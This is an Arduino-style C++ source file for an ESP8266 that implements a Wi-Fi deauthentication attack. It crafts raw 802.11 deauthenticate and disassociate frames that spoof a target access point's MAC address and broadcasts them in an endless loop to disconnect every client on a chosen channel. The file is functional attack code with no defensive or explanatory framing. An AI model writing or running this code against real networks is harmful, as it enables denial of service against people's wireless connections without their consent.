#include <ESP8266WiFi.h>
#include "Deauther.h"

uint8_t deauthPacket[PACKET_SIZE] = {
  /*0 - 1*/  0x00, 0x00, // Frame Control -> Packet type
  /*2 - 3*/  0x00, 0x00, // Duration
  /*4 - 9*/  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast) (all 0xff means to everyone instead of a specific device)
  /*10 - 15*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
  /*16 - 21*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
  /*22 - 23*/  0x00, 0x00, // Fragment & Sequence number
  /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
};

bool deauthSetup(){
  wifi_promiscuous_enable(1);

  uint8_t targetBSSID[MAC_ADDR_LEN] = {0};

  return true;
}

// generic function to handle packet sending
bool sendPacket(uint8_t* packet, uint8_t pktSize, char* pktType){
  int result = wifi_send_pkt_freedom(packet, pktSize, 0);

  if(result != 0){
    // Serial.printf("%s PACKET FAILED: %d\n", pktType, result);
  }else{
    // Serial.printf("%s PACKET SENT: %d\n", pktType, result);
  }
  return result == 0;
}

// void deauthAttack() {
void deauthNetwork(uint8_t targetChannel, uint8_t* targetBSSID){
  Serial.println("Deauthing...");
  wifi_set_channel(targetChannel);
  
  // initialize deauth packet with target's BSSID
  uint8_t deauthPkt[PACKET_SIZE];
  memcpy(deauthPkt, deauthPacket, PACKET_SIZE);
  memcpy(&deauthPkt[10], targetBSSID, MAC_ADDR_LEN);
  memcpy(&deauthPkt[16], targetBSSID, MAC_ADDR_LEN);
  deauthPkt[0] = 0xc0; // change packet type to Deauthenticate

  // initialize disassociate packet from deauth packet
  uint8_t disassociatePkt[PACKET_SIZE];
  memcpy(disassociatePkt, deauthPkt, PACKET_SIZE);
  disassociatePkt[0] = 0xa0; // change packet type to Disassociate

  //send both packets
  while (true){
    sendPacket(deauthPkt, PACKET_SIZE, "Deauth\0");
    delay(5);
    sendPacket(disassociatePkt, PACKET_SIZE, "Disassociate\0");
    delay(5);
  }
}